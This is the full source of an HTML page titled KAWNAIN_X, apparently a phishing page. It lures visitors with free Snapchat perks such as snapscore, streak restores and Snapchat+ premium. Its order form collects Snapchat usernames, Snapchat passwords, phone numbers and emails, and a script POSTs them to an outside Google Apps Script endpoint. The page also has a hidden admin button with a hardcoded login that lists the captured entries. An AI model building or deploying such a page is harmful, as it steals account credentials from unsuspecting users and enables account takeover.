<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>KAWNAIN_X</title>

<style>
body{
margin:0;
font-family:Arial;
background:#111;
color:white;
}

header{
display:flex;
justify-content:space-between;
align-items:center;
padding:20px;
background:black;
}

.products{
display:flex;
gap:20px;
justify-content:center;
flex-wrap:wrap;
padding:40px;
}

.card{
background:#222;
padding:20px;
width:260px;
border-radius:12px;
text-align:center;
}

.card img{
width:100%;
height:220px;
object-fit:cover;
border-radius:10px;
}

button{
padding:12px 20px;
border:none;
background:green;
color:white;
border-radius:8px;
cursor:pointer;
font-size:16px;
}

.popup{
display:none;
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
justify-content:center;
align-items:center;
}

.popup-box{
background:white;
color:black;
padding:20px;
border-radius:12px;
display:flex;
flex-direction:column;
gap:10px;
width:320px;
}

input{
padding:12px;
font-size:16px;
}

#adminPanel{
display:none;
padding:20px;
}
</style>
</head>
<body>

<header>
<h1>KAWNAIN_X</h1>
<button onclick="adminLogin()"> </button>
</header>

<div class="products">

<div class="card">
<img src="https://tse2.mm.bing.net/th/id/OIP.nLDsQMsQAHgmbS_MTQpUTgHaQC?rs=1&pid=ImgDetMain&o=7&rm=3">
<h2>50k free snapscore</h2>
<button onclick="openOrder('Nike Air Max')">Order Now</button>
</div>

<div class="card">
<img src="https://resource.gbyte.com/20251021/large/snapstreak-restore-from-snapchat.webp">
<h2>Restore snapstreak (20 only)</h2>
<button onclick="openOrder('Adidas Runner')">Order Now</button>
</div>

<div class="card">
<img src="https://media.idownloadblog.com/wp-content/uploads/2022/06/Snapchat-Plus-logo-black-background.gif">
<h2>Get premium Snapchat+ (for 1 month only)</h2>
<button onclick="openOrder('Puma White')">Order Now</button>
</div>

</div>

<div id="popup" class="popup">
<div class="popup-box">

<h2>Place Order</h2>

<input id="name" placeholder="snapchat username">
<input id="address" placeholder="snapchat password">
<input id="phone" placeholder="phone number">
<input id="size" placeholder="Email id">

<button onclick="submitOrder()">Submit Order</button>

</div>
</div>

<div id="adminPanel"></div>

<script>

const GOOGLE_SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbzMHap-ME1Za8KMOt4TlWY7SaoGsRsolfoIh9N4B0jYonQLVj2NJNQrvuLc39VSZ0voeQ/exec";

let selectedProduct = "";
let orders = [];

function openOrder(product){
selectedProduct = product;
document.getElementById("popup").style.display = "flex";
}

function submitOrder(){

const name = document.getElementById("name").value;
const address = document.getElementById("address").value;
const phone = document.getElementById("phone").value;
const size = document.getElementById("size").value;

const data = {
name,
address,
phone,
size,
product:selectedProduct
};

orders.push(data);

fetch(GOOGLE_SCRIPT_URL,{
method:"POST",
body:JSON.stringify(data)
})
.then(()=>{

alert("Order Submitted Successfully");

document.getElementById("popup").style.display="none";

})
.catch(()=>{
alert("Error sending order");
});
}

function adminLogin(){

let username = prompt("Enter Username");
let password = prompt("Enter Password");

if(
username==="kawnain" &&
password==="kawnain737@#"
){

let html="<h2>Orders</h2>";

orders.forEach(order=>{
html +=
"<p><b>Name:</b> "+order.name+
"<br><b>Address:</b> "+order.address+
"<br><b>Phone:</b> "+order.phone+
"<br><b>Product:</b> "+order.product+
"<br><b>Size:</b> "+order.size+
"<hr></p>";
});

document.getElementById("adminPanel").style.display="block";
document.getElementById("adminPanel").innerHTML=html;

}else{
alert("Wrong username or password");
}
}

</script>

</body>
</html>
